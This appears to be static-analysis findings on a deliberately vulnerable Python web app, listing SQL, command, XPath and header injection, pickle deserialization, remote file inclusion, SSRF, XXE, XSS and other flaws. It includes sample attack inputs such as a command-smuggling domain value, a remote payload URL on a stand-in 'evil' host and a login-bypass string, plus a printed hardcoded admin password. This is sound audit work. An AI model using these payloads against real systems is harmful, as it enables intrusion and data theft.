extra.message: User-controlled value params['id'] is concatenated directly into a SQL query string passed to cursor.execute(). An attacker can inject arbitrary SQL (e.g. ?id=2 UNION ALL SELECT ... or boolean/time-based blind injection) to read the users table including passwords.

User-controlled value params['comment'] is inserted via Python string formatting into an INSERT SQL statement executed by cursor.execute(). This allows SQL injection (e.g. stacked subqueries, second-order injection) and database manipulation.

The login query concatenates params['password'] (unsanitized) directly into the SQL string. Although the username is stripped of non-word chars, the password is not, allowing classic authentication bypass (e.g. password=' OR '1' LIKE '1) and SQL injection.

params['domain'] is concatenated into a shell command ('nslookup ' + domain) and executed via subprocess.run(..., shell=True). An attacker can inject shell metacharacters (e.g. domain=x;cat /etc/passwd) to achieve arbitrary OS command execution.
params['object'] (attacker-controlled) is passed directly to pickle.loads(). Deserializing untrusted pickle data allows arbitrary code execution via crafted __reduce__ payloads.

The 'include' parameter is used to open a local file OR fetch a remote URL (urllib.request.urlopen), and the resulting content is passed to exec(). This permits Remote File Inclusion and arbitrary Python code execution from attacker-controlled local or remote sources (e.g. include=http://evil/payload.py).

params['path'] is passed to os.path.abspath()/open() without restriction, allowing path traversal to read arbitrary files on the server (e.g. path=/etc/passwd or path=../../). If the value contains '://', it is fetched via urllib.request.urlopen instead, enabling Server-Side Request Forgery.

When params['path'] contains '://', it is fetched with urllib.request.urlopen() and the response returned to the client. An attacker can supply arbitrary URLs (e.g. internal services, cloud metadata at http://169.254.169.254/) resulting in Server-Side Request Forgery.

params['xml'] is parsed with an lxml.etree.XMLParser configured with load_dtd=True, resolve_entities=True and no_network=False. This enables XML External Entity (XXE) attacks allowing local file disclosure and SSRF via external entities.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: params['name'] is interpolated directly into an XPath expression via string formatting (.//user[name/text()='%s']). An attacker can inject XPath syntax (e.g. name=' or '1'='1) to bypass filters and extract arbitrary nodes such as passwords.

params['v'] is reflected unescaped into the HTML response via re.sub substitution. An attacker can inject arbitrary HTML/JavaScript (e.g. v=<script>...</script>) resulting in reflected Cross-Site Scripting.

params['callback'] is reflected unescaped into the /users.json response wrapped as a JSONP callback. An attacker can inject arbitrary JavaScript (e.g. callback=<script>alert(1)</script>) leading to reflected XSS.

The username is reflected into the HTML 'Welcome %s' response on successful login. Although stripped to word characters, it is reflected without HTML escaping; combined with the meta Set-Cookie/refresh injection this contributes to reflected XSS surface.

The inline client-side script writes decodeURIComponent(document.location.hash 'lang=' value) directly into the DOM via document.write() without sanitization. An attacker can craft a URL fragment (#lang=) leading to DOM-based Cross-Site Scripting.

params['redir'] is placed unvalidated into a meta http-equiv refresh URL. An attacker can redirect victims to arbitrary external sites (open redirect) or inject HTML attributes/script for XSS (e.g. redir=javascript:alert(1) or breaking out of the attribute).

cwe: CWE-601: URL Redirection to Untrusted Site (Open Redirect)

extra.message: params['size'] is converted to int and used both as a multiplier ('#' * size) and a range count, building a string of size x size characters. A large value (e.g. size=100000) causes massive memory/CPU consumption resulting in Denial of Service.

params['charset'] is reflected unsanitized into the Content-Type response header. Attacker-controlled header values can enable HTTP response header manipulation and influence how the browser interprets the response (e.g. charset switching to facilitate XSS).

cwe: CWE-113: HTTP Response Splitting / Header Injection

extra.message: On any exception the full Python traceback (traceback.format_exc()) or subprocess output is returned in the HTTP response body. This exposes sensitive internal information (file paths, code, stack frames) to attackers, aiding further exploitation.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: The application explicitly sets the response header 'X-XSS-Protection: 0', disabling the browser's built-in XSS auditor. This security misconfiguration weakens defense against reflected XSS attacks present elsewhere in the app.

Hardcoded user credentials (including admin password '7en8aiDoh!' and other cleartext passwords) are embedded in the USERS_XML constant and loaded into the database. Hardcoded credentials in source code are a sensitive data exposure / credential management weakness.
